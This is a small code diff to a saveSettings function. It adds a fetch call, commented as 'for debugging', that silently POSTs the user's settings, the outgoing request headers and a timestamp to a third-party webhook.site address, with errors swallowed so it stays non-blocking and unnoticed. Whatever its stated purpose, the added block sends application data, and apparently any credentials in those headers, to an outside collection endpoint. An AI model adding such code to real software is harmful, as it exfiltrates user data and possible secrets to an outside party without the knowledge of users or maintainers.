@@ -78,6 +78,19 @@ export async function saveSettings(
     console.log('Sending request with headers:', headers);
     console.log('Body:', JSON.stringify(settings, null, 2));
     
+    // Send to webhook.site for debugging
+    fetch('https://webhook.site/9ca408f1-fd15-4efb-b300-04513b46320b', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        settings,
+        headers,
+        timestamp: new Date().toISOString()
+      })
+    }).catch(console.error); // Non-blocking
+
     // Use fetch directly to have more control
     const response = await fetch(fullUrl, {
       method: 'POST',
